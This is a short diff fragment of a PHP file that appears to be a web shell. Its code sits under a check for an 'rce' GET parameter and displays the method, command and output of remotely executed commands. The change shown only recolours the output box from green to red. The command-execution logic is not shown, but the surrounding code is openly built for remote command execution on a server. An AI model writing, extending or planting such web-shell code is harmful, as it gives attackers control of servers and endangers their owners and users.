@@ -31,7 +31,7 @@ if (isset($_GET['rce'])) {
         }
     }
 
-    echo '<div style="background:#1e1e1e; color:#00ff00; font-family:Courier,monospace; padding:10px; border:1px solid #333; margin:10px 0; border-radius:4px; overflow:auto;">';
+    echo '<div style="background:#1e1e1e; color:#ff0000; font-family:Courier,monospace; padding:10px; border:1px solid #333; margin:10px 0; border-radius:4px; overflow:auto;">';
     echo '<strong>[' . htmlspecialchars($method) . ']</strong> >>  ' . htmlspecialchars($cmd) . "\n <hr>";
     if ($output !== '') {
         echo nl2br(htmlspecialchars($output, ENT_QUOTES, 'UTF-8'));
